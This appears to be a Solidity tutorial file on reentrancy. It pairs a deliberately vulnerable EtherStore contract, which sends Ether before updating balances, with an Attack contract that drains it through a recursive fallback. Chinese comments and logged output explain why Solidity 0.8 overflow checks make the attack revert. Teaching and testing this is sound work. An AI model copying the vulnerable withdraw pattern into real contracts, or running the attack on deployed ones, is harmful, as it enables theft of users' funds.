// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "hardhat/console.sol";

/*
Reentrancy
- What is reentrancy?
- Remix code and demo
- Preventative techniques
*/

contract EtherStore {
    mapping(address => uint) balances;

    function deposit() public payable {
        console.log("deposit begin");
        balances[msg.sender] += msg.value;
        console.log("deposit ends");
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);

        console.log("before msg.sender.call");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether fuck");

        console.log("sent is", sent);
        console.log("after msg.sender.call");

        balances[msg.sender] -= _amount;
        console.log("withdraw ends");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        console.log("fallback begin");
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
        console.log("fallback ends");
    }

    function attack() external payable {
        console.log("attack begin");
        require(msg.value >= 1 ether);
        // 0.5
        // etherStore.deposit.value(1 ether)();
        // 0.6
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
        console.log("attack ends");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

/*
1. Solidity v0.8.0 Breaking Changes
   https://docs.soliditylang.org/en/latest/080-breaking-changes.html
2. Error handling: Assert, Require, Revert and Exceptions
   https://docs.soliditylang.org/en/latest/control-structures.html?highlight=revert#error-handling-assert-require-revert-and-exceptions
3. Reentrancy hack in Solidity no longer working on pragma ^0.8.0
   https://stackoverflow.com/questions/67722470/reentrancy-hack-in-solidity-no-longer-working-on-pragma-0-8-0

从运行输出的log输出,可以看到,因为0.8增加了Arithmetic operations revert on underflow and overflow.
所以在33行发生revert,然后pop up到callback,再之后msg.sender.call的调用返回false,导致require失败
最终revert使Re-entrancy攻击失败

console.log:
 attack begin
 deposit begin
 deposit ends
 before msg.sender.call
 fallback begin
 before msg.sender.call
 fallback begin
 before msg.sender.call
 fallback begin
 fallback ends
 sent is true
 after msg.sender.call
 withdraw ends
 fallback ends
 sent is true
 after msg.sender.call

transact to Attack.attack errored: VM error: revert.

revert
	The transaction has been reverted to the initial state.
Reason provided by the contract: "Failed to send Ether fuck".
Debug the transaction to get more information.

*/
